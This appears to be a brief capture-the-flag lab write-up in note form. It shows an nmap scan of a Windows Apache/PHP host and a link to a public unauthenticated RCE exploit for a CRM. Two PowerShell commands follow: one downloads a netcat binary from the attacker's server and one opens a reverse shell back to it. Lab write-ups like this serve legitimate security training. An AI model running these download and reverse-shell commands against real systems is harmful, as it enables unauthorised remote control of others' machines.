# nmap 
```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-17 23:17 CDT
Nmap scan report for 10.129.25.107
Host is up (0.25s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut

```

# The site uses a crm with an unauthenticated RCE [exploit](https://www.exploit-db.com/exploits/48506)
![[Pasted image 20241018124126.png]]

# Gained shell after running the exploit, then I download a netcat binary to have a stabilized shell

```powershell
powershell.exe -c "IWR http://10.10.14.84:8000/nc64.exe -OutFile nc.exe"

powershell -c "./nc.exe -e cmd.exe 10.10.14.84 4444" 

```

